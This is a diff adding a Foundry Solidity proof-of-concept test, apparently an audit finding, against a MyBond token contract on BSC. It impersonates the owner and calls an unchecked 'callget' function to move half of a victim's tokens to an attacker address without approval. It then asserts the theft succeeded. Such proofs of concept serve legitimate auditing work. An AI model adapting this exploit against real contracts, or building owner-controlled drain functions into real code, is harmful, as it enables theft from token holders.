@@ -1,0 +1,89 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+import "forge-std/Test.sol";
+
+interface IMyBond {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
+    function burn(uint256 amount) external;
+    function burnFrom(address account, uint256 amount) external;
+    function isOperator() external view returns (bool);
+    function mint(address recipient_, uint256 amount_) external returns (bool);
+    function operator() external view returns (address);
+    function owner() external view returns (address);
+    function renounceOwnership() external;
+    function transferOperator(address newOperator_) external;
+    function transferOwnership(address newOwner) external;
+    function callget(address _from, address _to, uint256 _amount) external;
+}
+
+contract ExploitTest is Test {
+    // Deployed MyBond contract on BSC
+    IMyBond constant bond = IMyBond(0xF347bDc0e502D33978b3c4d187bf75E5B452E491);
+
+    address attacker = address(0xdead);
+    address victim = address(0xbeef);
+    uint256 victimBalance = 1000 * 1e18; // 1000 BOND
+
+    function setUp() public {
+        // Label addresses for trace readability
+        vm.label(address(bond), "MyBond");
+        vm.label(attacker, "Attacker");
+        vm.label(victim, "Victim");
+
+        // Determine the storage slot for balance mapping
+        // Mapping _balances is at slot 0
+        // Balance of victim is at keccak256(abi.encode(victim, 0))
+        bytes32 balanceSlot = keccak256(abi.encode(victim, 0));
+
+        // Set victim's balance directly via vm.store to simulate pre-existing tokens
+        vm.store(address(bond), balanceSlot, bytes32(victimBalance));
+
+        // Verify victim balance is set correctly
+        assertEq(bond.balanceOf(victim), victimBalance, "Victim balance not set");
+    }
+
+    function testMissingSanityCheck() public {
+        // Get the owner of the contract
+        address owner = bond.owner();
+        vm.label(owner, "Owner");
+
+        // Assume we can act as the owner (simulate owner being malicious)
+        // The owner can call callget to transfer any amount from any address to any address
+        uint256 stealAmount = victimBalance / 2; // steal half of victim's tokens
+
+        // Pre-state balances
+        uint256 attackerBalanceBefore = bond.balanceOf(attacker);
+        uint256 victimBalanceBefore = bond.balanceOf(victim);
+
+        // Owner executes callget to steal tokens from victim to attacker
+        vm.prank(owner);
+        bond.callget(victim, attacker, stealAmount);
+
+        // Post-state balances
+        uint256 attackerBalanceAfter = bond.balanceOf(attacker);
+        uint256 victimBalanceAfter = bond.balanceOf(victim);
+
+        // Assert that tokens were transferred without victim's approval
+        assertEq(attackerBalanceAfter, attackerBalanceBefore + stealAmount, "Attacker did not receive stolen tokens");
+        assertEq(victimBalanceAfter, victimBalanceBefore - stealAmount, "Victim did not lose tokens");
+
+        // Also verify that the allowance was never set by victim
+        assertEq(bond.allowance(victim, owner), 0, "Victim never approved owner");
+
+        // Exploit successful: owner stole tokens with no approval
+        emit log("Owner successfully transferred tokens from Victim without approval");
+    }
+}
+```
